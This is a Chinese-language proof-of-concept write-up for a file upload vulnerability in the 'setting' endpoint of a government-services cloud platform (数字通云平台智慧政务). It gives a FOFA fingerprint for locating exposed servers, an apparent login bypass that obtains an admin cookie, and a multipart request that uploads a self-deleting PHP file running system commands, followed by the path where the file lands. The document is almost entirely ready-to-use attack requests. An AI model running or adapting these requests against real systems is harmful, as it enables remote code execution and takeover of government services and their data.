# 数字通云平台智慧政务setting存在文件上传漏洞

数字通云平台智慧政务setting存在文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```java
body="assets/8cca19ff/css/bootstrap-yii.css"
```

## poc

获取cookie

```javascript
POST /portal/default/login HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0

userID=admin&flag=rone
```

携带cookie

```javascript
POST /sys/mobile/setting HTTP/1.1
Host: 
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: your-cookie
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------318638034016337576332132513456

-----------------------------318638034016337576332132513456
Content-Disposition: form-data; name="MobileApplication[cert]"; filename="1.php"
Content-Type: application/octet-stream

<?php system("whoami");unlink(__FILE__);?>
-----------------------------318638034016337576332132513456--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409201619573.png)

文件路径：`/static/seal/1.php`